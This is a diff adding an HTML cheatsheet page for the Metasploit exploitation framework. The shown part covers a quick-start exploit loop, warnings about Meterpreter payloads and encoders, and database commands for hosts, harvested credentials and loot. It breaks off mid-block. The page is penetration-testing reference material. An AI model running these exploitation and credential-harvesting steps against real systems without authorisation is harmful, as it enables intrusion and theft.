@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Metasploit Cheatsheet — MSF Console, Database &amp; Payloads | OPKIT</title>
+  <meta name="description" content="Complete Metasploit Framework reference: database setup, workspaces, module search, staged vs stageless payloads, multi/handler, Meterpreter, post-exploitation, msfvenom, Malleable C2 evasion, and cheatsheet.">
+    <link rel="icon" type="image/webp" href="../images/Logo.webp">
+  <link rel="apple-touch-icon" href="../images/Logo.webp">
+  <link rel="stylesheet" href="../assets/style.css">
+  <style>:root { --tool-color: #a855f7; }</style>
+</head>
+<body>
+<nav class="nav" role="navigation" aria-label="Main navigation">
+  <div class="nav__inner">
+        <a href="../index.html" class="nav__logo" aria-label="OPKIT Home">
+      <span class="nav__logo-mark" aria-hidden="true"><img src="../images/Logo.webp" alt="OPKIT Logo" class="nav__logo-img"></span>
+      <span class="nav__logo-text">OPKIT</span>
+    </a>
+    <div class="nav__links"><a href="../index.html" class="nav__link">Tools</a></div>
+    <div class="nav__search"><div class="nav__search-wrap" style="position:relative"><svg class="nav__search-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg><input id="nav-search" class="nav__search-input" type="search" placeholder="Search commands…" autocomplete="off" spellcheck="false" aria-label="Search commands"><div id="nav-search-dropdown" class="search-dropdown" role="listbox"></div></div></div>
+    <button class="nav__theme-btn" onclick="toggleTheme()" aria-label="Toggle theme"><span data-theme-icon></span></button>
+    <button class="nav__hamburger" id="nav-hamburger" aria-label="Open sidebar" onclick="document.getElementById('tool-sidebar').classList.toggle('is-open');document.getElementById('sidebar-overlay').classList.toggle('is-active')"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button>
+  </div>
+</nav>
+
+<div class="tool-page">
+  <div class="sidebar-overlay" id="sidebar-overlay" onclick="this.classList.remove('is-active');document.getElementById('tool-sidebar').classList.remove('is-open')"></div>
+  <aside class="tool-sidebar" id="tool-sidebar" aria-label="Metasploit navigation">
+    <div class="tool-sidebar__head">
+      <a href="../index.html" class="tool-sidebar__back"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M19 12H5M12 5l-7 7 7 7"/></svg>All tools</a>
+      <div class="tool-sidebar__tool-id">
+        <div class="tool-sidebar__icon">
+          <img src="https://www.kali.org/tools/metasploit-framework/images/metasploit-framework-logo.svg" alt="Metasploit" onerror="this.onerror=null;this.src='../images/tools/metasploit.svg';">
+        </div>
+        <div>
+          <div class="tool-sidebar__name">Metasploit</div>
+          <div class="tool-sidebar__version">v6.x · Exploit framework</div>
+        </div>
+      </div>
+    </div>
+    <nav class="tool-sidebar__nav" aria-label="Page sections">
+      <div class="sidebar-group">
+        <div class="sidebar-group__label">Workflow Reference</div>
+        <div class="sidebar-nav-item is-active" data-section="overview">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 6h16M4 12h16M4 18h7"/></svg>
+          Overview
+        </div>
+        <div class="sidebar-nav-item" data-section="pitfalls">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+          Critical Pitfalls &amp; Risks
+        </div>
+        <div class="sidebar-nav-item" data-section="database">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>
+          Database &amp; Workspaces
+        </div>
+        <div class="sidebar-nav-item" data-section="search">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+          Search &amp; Modules
+        </div>
+        <div class="sidebar-nav-item" data-section="payloads">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 13a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.18 2h3a2 2 0 0 1 2 1.72"/></svg>
+          Payloads &amp; Listeners
+        </div>
+        <div class="sidebar-nav-item" data-section="meterpreter">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
+          Meterpreter &amp; Post-Exploit
+        </div>
+        <div class="sidebar-nav-item" data-section="msfvenom">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          msfvenom &amp; Evasion
+        </div>
+        <div class="sidebar-nav-item" data-section="cheatsheet">
+          <svg class="sidebar-nav-item__icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+          Cheatsheet
+        </div>
+      </div>
+    </nav>
+  </aside>
+
+  <main class="tool-content" id="main-content">
+    <!-- Hero -->
+    <div class="tool-hero" id="overview">
+      <div class="tool-hero__kicker"><svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><circle cx="12" cy="12" r="10"/></svg>Exploitation Framework · Ruby</div>
+      <h1 class="tool-hero__title">Metasploit</h1>
+      <p class="tool-hero__desc">The industry standard penetration testing framework for discovering, validating, and executing exploit payloads. Encompasses over 2,400 exploit and auxiliary modules, PostgreSQL asset tracking, Meterpreter in-memory C2, pivoting, and Malleable C2 evasion.</p>
+      <div class="tool-hero__tags">
+        <span class="tool-hero__tag">msfdb</span>
+        <span class="tool-hero__tag">Workspaces</span>
+        <span class="tool-hero__tag">multi/handler</span>
+        <span class="tool-hero__tag">Meterpreter</span>
+        <span class="tool-hero__tag">Staged vs Stageless</span>
+        <span class="tool-hero__tag">Malleable C2</span>
+        <span class="tool-hero__tag">Pivoting</span>
+      </div>
+    </div>
+
+    <!-- First 3 Commands (Quick Start) -->
+    <div class="cmd-block is-open" style="margin-bottom: var(--sp-6); border-color: rgba(168, 85, 247, 0.35); box-shadow: 0 4px 20px rgba(0,0,0,0.18);" role="region" aria-label="First 3 Commands quick start">
+      <div class="cmd-block__head" style="background: rgba(168, 85, 247, 0.08); border-bottom-color: rgba(168, 85, 247, 0.2);">
+        <div>
+          <div class="cmd-block__label" style="display:flex; align-items:center; gap:var(--sp-2); color: var(--c-text);">
+            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:var(--tool-color, var(--c-accent));" aria-hidden="true"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+            First 3 Commands — Quick Start
+          </div>
+          <div class="cmd-block__desc">The core exploitation loop: Search &rarr; Configure &rarr; Check &rarr; Run &rarr; Interact. Run each command sequentially.</div>
+        </div>
+      </div>
+      <div class="cmd-block__body">
+        <!-- Step 1: Launch & Database -->
+        <div style="font-size: var(--t-xs); font-weight: 700; color: var(--c-accent); padding: var(--sp-2) var(--sp-4) var(--sp-1); text-transform: uppercase; letter-spacing: 0.05em; display: flex; align-items: center; gap: var(--sp-2);">
+          <span style="background: rgba(168, 85, 247, 0.2); color: #c084fc; border-radius: 4px; padding: 1px 6px; font-size: 10px;">1</span> Launch &amp; Database
+        </div>
+        <div class="code-line">
+          <span class="code-line__prompt" aria-hidden="true">$</span>
+          <code class="code-line__code"><span class="tok-cmd">msfconsole</span> <span class="tok-flag">-q</span></code>
+          <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); white-space:nowrap; opacity:0.85;">Launch console in quiet mode</span>
+          <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+        </div>
+        <div class="code-line">
+          <span class="code-line__prompt" aria-hidden="true">msf&gt;</span>
+          <code class="code-line__code"><span class="tok-cmd">db_status</span></code>
+          <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); white-space:nowrap; opacity:0.85;">Verify PostgreSQL connectivity</span>
+          <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+        </div>
+
+        <!-- Step 2: Find & Configure Module -->
+        <div style="font-size: var(--t-xs); font-weight: 700; color: var(--c-accent); padding: var(--sp-3) var(--sp-4) var(--sp-1); border-top: 1px solid rgba(255, 255, 255, 0.06); text-transform: uppercase; letter-spacing: 0.05em; display: flex; align-items: center; gap: var(--sp-2);">
+          <span style="background: rgba(168, 85, 247, 0.2); color: #c084fc; border-radius: 4px; padding: 1px 6px; font-size: 10px;">2</span> Find &amp; Configure Module
+        </div>
+        <div class="code-line">
+          <span class="code-line__prompt" aria-hidden="true">msf&gt;</span>
+          <code class="code-line__code"><span class="tok-cmd">search</span> <span class="tok-val">cve:2021-44228</span></code>
+          <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); white-space:nowrap; opacity:0.85;">Search target exploit by CVE</span>
+          <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+        </div>
+        <div class="code-line">
+          <span class="code-line__prompt" aria-hidden="true">msf&gt;</span>
+          <code class="code-line__code"><span class="tok-cmd">use</span> <span class="tok-val">0</span></code>
+          <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); white-space:nowrap; opacity:0.85;">Select module from search index</span>
+          <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+        </div>
+        <div class="code-line">
+          <span class="code-line__prompt" aria-hidden="true">msf&gt;</span>
+          <code class="code-line__code"><span class="tok-cmd">show</span> <span class="tok-val">options</span></code>
+          <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); white-space:nowrap; opacity:0.85;">Inspect required parameters (RHOSTS, LHOST)</span>
+          <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+        </div>
+
+        <!-- Step 3: Validate, Exploit & Interact -->
+        <div style="font-size: var(--t-xs); font-weight: 700; color: var(--c-accent); padding: var(--sp-3) var(--sp-4) var(--sp-1); border-top: 1px solid rgba(255, 255, 255, 0.06); text-transform: uppercase; letter-spacing: 0.05em; display: flex; align-items: center; gap: var(--sp-2);">
+          <span style="background: rgba(168, 85, 247, 0.2); color: #c084fc; border-radius: 4px; padding: 1px 6px; font-size: 10px;">3</span> Validate &amp; Exploit
+        </div>
+        <div class="code-line">
+          <span class="code-line__prompt" aria-hidden="true">msf&gt;</span>
+          <code class="code-line__code"><span class="tok-cmd">check</span></code>
+          <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); white-space:nowrap; opacity:0.85;">Safe vulnerability pre-flight check</span>
+          <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+        </div>
+        <div class="code-line">
+          <span class="code-line__prompt" aria-hidden="true">msf&gt;</span>
+          <code class="code-line__code"><span class="tok-cmd">run</span></code>
+          <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); white-space:nowrap; opacity:0.85;">Execute exploit and spawn session</span>
+          <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+        </div>
+        <div class="code-line">
+          <span class="code-line__prompt" aria-hidden="true">msf&gt;</span>
+          <code class="code-line__code"><span class="tok-cmd">sessions</span> <span class="tok-flag">-i</span> <span class="tok-val">1</span></code>
+          <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); white-space:nowrap; opacity:0.85;">Interact with created Meterpreter session</span>
+          <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Critical Pitfalls & Risks -->
+    <section class="content-section" id="pitfalls" aria-labelledby="pitfalls-title">
+      <div class="callout callout--warn" role="alert" style="margin-bottom: var(--sp-4);">
+        <svg class="callout__icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+        <div class="callout__body">
+          <strong style="color:var(--c-warn); display:block; margin-bottom:var(--sp-2);">Why is my exploit failing? — The check command, encoders, and session traps.</strong>
+          <ul style="margin:0; padding-left:1.25rem; line-height:1.6; font-size:var(--t-sm);">
+            <li><strong>Always run <code>check</code> before <code>run</code>:</strong> The <code>check</code> command safely evaluates target banner and version signatures without transmitting exploit payloads or injecting memory. Firing blindly can trigger kernel blue screens, crash production daemons, or cause permanent denial of service.</li>
+            <li><strong>Encoders (shikata_ga_nai) do NOT bypass modern AV/EDR:</strong> Encoders exist solely to eliminate bad characters (such as null bytes <code>\x00</code>) that break string parsing in memory. Modern endpoint protection engines analyze behavioral execution and API calls. Generating payloads with <code>-i 20</code> iterations simply corrupts the binary and still triggers immediate detection.</li>
+            <li><strong>Staged vs. Stageless mismatch breaks shells:</strong> If you generate a staged payload (<code>windows/x64/meterpreter/reverse_tcp</code>), you must catch it with <code>exploit/multi/handler</code>. If caught with a plain Netcat listener, you only receive garbage bytes because Netcat cannot transmit the second stage. Use a stageless payload (<code>windows/x64/meterpreter_reverse_tcp</code>) if catching with Netcat.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="callout callout--info" role="note">
+        <svg class="callout__icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        <div class="callout__body">
+          <strong style="display:block; margin-bottom:var(--sp-1); color:var(--c-text);">A database is not optional.</strong>
+          Metasploit's PostgreSQL database records discovered IP addresses, open ports, services, extracted credentials, and loot. Without it, you are manually tracking recon in text files. Always run <code>sudo systemctl start postgresql &amp;&amp; msfdb init</code> before launching msfconsole. Use Workspaces (<code>workspace -a ClientName</code>) to keep customer engagements isolated. Import external Nmap scans directly with <code>db_import scan.xml</code> to populate your target list automatically.
+        </div>
+      </div>
+    </section>
+
+    <!-- 1. Database & Workspaces -->
+    <section class="content-section" id="database" aria-labelledby="database-title">
+      <h2 class="content-section__title" id="database-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>
+        Database &amp; Workspaces
+      </h2>
+      <div class="cmd-list" role="list">
+        <!-- Block 1: Init -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Database initialization and verification</div>
+              <div class="cmd-block__desc">Start PostgreSQL, initialize the msfdb backend, and verify active connectivity.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">$</span>
+              <code class="code-line__code"><span class="tok-cmd">sudo</span> <span class="tok-val">systemctl</span> <span class="tok-val">start</span> <span class="tok-val">postgresql</span> &amp;&amp; <span class="tok-cmd">msfdb</span> <span class="tok-val">init</span></code>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">db_status</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Expected: Connected to msf. Connection type: postgresql</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 2: Workspaces -->
+        <div class="cmd-block" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Workspaces — Multi-engagement isolation</div>
+              <div class="cmd-block__desc">Prevent target cross-contamination between clients or testing environments.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">workspace</span> <span class="tok-flag">-a</span> <span class="tok-val">ClientAlpha</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Create and switch to new workspace</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">workspace</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">List all existing workspaces</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">workspace</span> <span class="tok-val">ClientAlpha</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Switch active workspace context</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 3: Import Recon -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Importing reconnaissance &amp; scanning in-console</div>
+              <div class="cmd-block__desc">Ingest XML scan files from Nmap or launch scans directly through the database wrapper.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">db_import</span> <span class="tok-val">nmap_scan.xml</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Import Nmap XML directly into current workspace</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">db_nmap</span> <span class="tok-flag">-sV</span> <span class="tok-flag">-sC</span> <span class="tok-flag">-O</span> <span class="tok-arg">10.10.10.1</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Execute Nmap and automatically ingest targets</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div style="font-size: var(--t-xs); color: var(--c-muted); padding: var(--sp-2) var(--sp-4); border-top: 1px solid rgba(255, 255, 255, 0.06); background: rgba(0, 0, 0, 0.12);">
+              <span style="color: var(--c-accent); font-weight: 600;">Integration Tip:</span> Pair with Nmap's <code>-oX</code> XML output. See the <a href="nmap.html#cheatsheet" style="color:var(--c-accent); text-decoration:underline;">Nmap page CHAIN cells</a> for bidirectional workflow chaining.
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 4: Query Data -->
+        <div class="cmd-block" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Querying database assets</div>
+              <div class="cmd-block__desc">Filter hosts, services, captured credentials, and loot stored in the database.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">hosts</span> <span class="tok-flag">-c</span> <span class="tok-val">address,os_name,purpose</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">List discovered hosts and operating systems</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">services</span> <span class="tok-flag">-p</span> <span class="tok-val">445,80,443</span> <span class="tok-flag">-u</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">List open ports and running service versions</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">creds</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">View harvested passwords and NTLM hashes</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">loot</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Display exfiltrated configuration files &amp; tokens</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 5: Automation & Engagement Logging -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Automation &amp; Engagement Logging — Resource scripts &amp; spool</div>
+              <div class="cmd-block__desc">Record every command you run for later replay or engagement evidence.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt">msf&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">makerc</span> <span class="tok-val">/tmp/eng.rc</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Save command history as a replayable resource script</span>
+              <button class="code-line__copy-btn" aria-label="Copy"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
